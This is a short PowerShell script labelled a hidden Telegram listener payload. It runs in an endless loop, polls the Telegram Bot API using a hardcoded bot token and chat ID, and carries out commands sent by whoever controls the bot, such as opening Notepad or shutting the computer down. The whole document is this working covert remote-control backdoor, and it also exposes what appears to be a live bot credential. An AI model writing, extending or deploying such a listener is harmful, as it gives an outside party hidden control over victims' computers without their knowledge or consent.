# payload.ps1 (Hidden Telegram Listener)
$botToken = "7614493434:AAHDtLRMIO1EGCduKAAMxvwPdnHGyP2aP1U"
$chatID = "8065486104"
$url = "https://api.telegram.org/bot$botToken/getUpdates"

while ($true) {
  $response = Invoke-RestMethod -Uri $url
  $latestCmd = $response.result[-1].message.text

  switch ($latestCmd) {
    "1" { Start-Process notepad }  # Example: Open Notepad
    "2" { shutdown /s /t 10 }      # Example: Shutdown PC
    "X" { exit }                   # Stop script
    }
  Start-Sleep -Seconds 10  # Check every 10 seconds
}
